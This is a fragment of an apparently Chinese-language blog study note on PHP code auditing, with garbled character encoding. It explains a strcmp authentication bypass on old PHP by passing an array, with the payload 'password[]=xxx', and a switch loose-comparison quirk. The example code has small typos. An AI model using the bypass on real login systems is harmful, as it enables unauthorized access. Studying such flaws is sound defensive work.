<h3 id="strcmpæ¼æ´ç»•è¿‡-php-v-lt-5-3"><a href="#strcmpæ¼æ´ç»•è¿‡-php-v-lt-5-3" class="headerlink" title="strcmpæ¼æ´ç»•è¿‡ php -v &lt;5.3"></a><strong>strcmp</strong>æ¼æ´ç»•è¿‡ <strong>php -v &lt;5.3</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $password=<span class="string">"***************"</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strcmp($_POST[<span class="string">'password'</span>], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Right!!!login success"</span>;n</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Wrong password.."</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><code>strcmp</code>æ˜¯æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœ<code>str1&lt;str2</code> åˆ™è¿”å›&lt;0 å¦‚æœ<code>str1&gt;str2</code>è¿”å›&gt;0 å¦‚æœä¸¤è€…ç›¸ç­‰,è¿”å›0</p>
<p>æˆ‘ä»¬æ˜¯ä¸çŸ¥é“<code>$password</code>çš„å€¼çš„ï¼Œé¢˜ç›®è¦æ±‚<code>strcmp</code>åˆ¤æ–­çš„æ¥å—çš„å€¼å’Œ<code>$password</code>å¿…éœ€ç›¸ç­‰ï¼Œstrcmpä¼ å…¥çš„æœŸæœ›ç±»å‹æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œå¦‚æœä¼ å…¥çš„æ˜¯ä¸ªæ•°ç»„ä¼šæ€ä¹ˆæ ·å‘¢</p>
<p>æˆ‘ä»¬ä¼ å…¥ <code>password[]=xxx</code> å¯ä»¥ç»•è¿‡ æ˜¯å› ä¸ºå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹ï¼Œå°†å‘ç”Ÿé”™è¯¯ï¼Œä½†æ˜¯è¿˜æ˜¯åˆ¤æ–­å…¶ç›¸ç­‰</p>
<pre><code>payload: password[]=xxx</code></pre><hr>
<h3 id="switchç»•è¿‡"><a href="#switchç»•è¿‡" class="headerlink" title="switchç»•è¿‡"></a>switchç»•è¿‡</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"4admin"</span>;</span><br><span class="line"><span class="keyword">switch</span> ($a) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail1"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail2"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail3"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"sucess"</span>;  <span class="comment">//ç»“æœè¾“å‡ºsuccess;</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"failall"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>åé¢æ…¢æ…¢å¡«å‘å§</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
</search>
